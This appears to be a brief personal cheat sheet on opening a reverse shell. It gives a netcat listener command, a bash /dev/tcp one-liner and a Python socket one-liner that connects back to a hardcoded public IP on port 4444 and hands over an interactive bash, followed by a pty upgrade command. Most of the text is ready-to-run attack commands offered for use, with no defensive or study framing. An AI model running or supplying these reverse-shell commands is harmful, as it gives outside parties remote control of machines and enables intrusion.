# To open reverse shell:
on the attack machine run:
```
nc -lvnp 4444
```
this will open a socket listening on port 4444, and then on the target machine run:
## if the machine have --enable-net-redirections set:
```
bash -i >& /dev/tcp/<ip>/4444 0>&1
```
## if the machine haven't, like default set of macos:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.89.102.16",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
This will connect to the port 4444 on the attack machine ip.
The connection can be unstable, so run the command to start a stable terminal, on mac it is really unstable, I think because of constant garbage collection, really random...:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
